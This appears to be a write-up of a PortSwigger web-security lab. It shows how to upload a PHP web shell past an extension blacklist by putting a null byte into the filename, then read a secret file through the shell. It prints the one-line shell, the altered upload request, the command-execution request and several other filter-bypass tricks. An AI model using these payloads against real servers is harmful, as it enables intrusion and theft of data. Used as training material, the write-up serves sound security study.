# Lab 05 — Web shell upload via obfuscated file extension

**Difficulty:** 🟡 Practitioner  
**Technique:** File Upload — null byte extension obfuscation  
**Link:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension

---

## Concept

The server validates the uploaded file's extension using a blacklist that blocks `.php`. However, the validation logic is vulnerable to null byte injection: by appending `%00` followed by an allowed extension (e.g. `.jpg`), the validator sees `shell.php%00.jpg` and considers it acceptable. The underlying filesystem truncates the filename at the null byte and writes the file as `shell.php`, which is then served and executed as PHP.

---

## Process

### Step 1 — Prepare the web shell

```
<?php echo system($_GET['command']); ?>
```

### Step 2 — Intercept the upload POST in Burp and send to Repeater

Upload the file normally with Burp Intercept ON. Capture the POST request and forward it to Repeater.

### Step 3 — Modify the filename with null byte injection

In Repeater, edit the `filename` field inside the multipart body:

```
Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>
```

Send the request. Server response confirms the file was stored under the resolved name:

```
The file avatars/shell.php has been uploaded.
```

> The validator read `.jpg` and passed it. The filesystem truncated at `\0` and wrote `shell.php`.

### Step 4 — Execute the payload via HTTP history

Instead of crafting a new GET request, recycled an existing one from Burp's HTTP request history and modified the path to inject the command directly:

```
GET /files/avatars/shell.php?command=cat+/home/carlos/secret HTTP/2
```

Response body contains the secret — lab solved.

---

## Takeaways

- Blacklist validation that only checks the final extension is bypassable at the parsing boundary between the validator and the filesystem
- Null byte (`\0`, `%00`) terminates strings in C-based functions — the filesystem writes a different filename than what the validator read
- `%00` works directly in Burp Repeater's raw editor without encoding issues — no need for the hex editor in this case
- Recycling a GET from HTTP history is faster than building a new request from scratch when the only change is the path
- Other obfuscation variants for cases where null bytes are stripped: double extension (`shell.php.jpg`), case variation (`.PhP`), trailing dot (`shell.php.`) — which one works depends on the specific sanitization logic

---

## References

- [File Upload Vulnerabilities — PortSwigger](https://portswigger.net/web-security/file-upload)
- [File Upload Cheat Sheet — HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload)
